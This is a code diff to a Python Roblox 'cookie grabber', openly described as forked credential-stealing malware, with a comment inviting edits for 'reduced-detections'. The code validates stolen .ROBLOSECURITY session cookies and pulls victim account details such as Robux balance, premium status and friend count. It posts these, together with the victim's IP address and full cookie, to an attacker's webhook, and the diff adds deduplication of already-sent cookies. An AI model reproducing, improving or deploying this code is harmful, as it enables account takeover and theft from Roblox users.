@@ -1,4 +1,4 @@
-## Replace Webhook on Line 148
+## Replace Webhook on Line 156
 ## This is not meant to be undetected, make any changes you see fit for any performance boosts or reduced-detections, but, this is just a simple implementation of what is otherwise a dualhooked cookie grabber
 ## Enjoy!
 
@@ -23,6 +23,10 @@ class SMTHGRB:
     def checker(self):
         if not robloxpy.Utils.CheckCookie(self.cookie) == "Valid Cookie":
             return requests.post(url=self.webhook, data={'content': f'Found a dead cookie on {self.platform}{" - Continuing." if self.platform != "Librewolf" else ""}'})
+
+        for embed in self.embeds:
+            if self.cookie in embed['description']:
+                return
         
         user = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":self.cookie}).json()
         id = user['UserID']
@@ -37,7 +41,7 @@ class SMTHGRB:
                 "description": f"Username: **{user['UserName']}**\nRobux: **R${int(user['RobuxBalance']):,}**\nPremium: **{user['IsPremium']}**\nCreated: **{robloxpy.User.External.CreationDate(id, 1)}** (*{int(robloxpy.User.External.GetAge(id)):,} days ago*)\nRAP: **{int(robloxpy.User.External.GetRAP(id)):,}**\nFriends: **{int(robloxpy.User.Friends.External.GetCount(id)):,}**\n\nIP Address: ||**{ip}**||\n\nCookie:\n||```fix\n{self.cookie}```||",
                 "color": 12452044,
                 "footer": {
-                    "text": "v2.2 ; Forked from Mani175's Cookie Grabber"
+                    "text": "v2.2.2 ; Forked from Mani175's Cookie Grabber"
                 }
             }
         )
